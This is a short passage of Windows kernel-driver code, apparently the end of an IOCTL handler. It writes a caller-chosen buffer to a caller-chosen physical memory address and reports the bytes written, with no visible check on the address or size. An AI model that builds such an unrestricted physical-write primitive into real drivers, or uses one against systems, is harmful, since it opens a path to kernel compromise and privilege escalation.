	NTSTATUS status = PhysMemWritePhysical(request->PhysicalAddress, kernelBuf, request->Size, &bytesWritten);

	auto response = (PhysicalMemoryResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (NT_SUCCESS(status))
	{
		response->BytesTransferred = (ULONG)bytesWritten;
		response->Success = 1;
	}
	else
	{
		response->BytesTransferred = 0;
		response->Success = 0;
	}

	ExFreePoolWithTag(kernelBuf, 'wPhM');
	*info = sizeof(PhysicalMemoryResponse);
	return STATUS_SUCCESS;
}
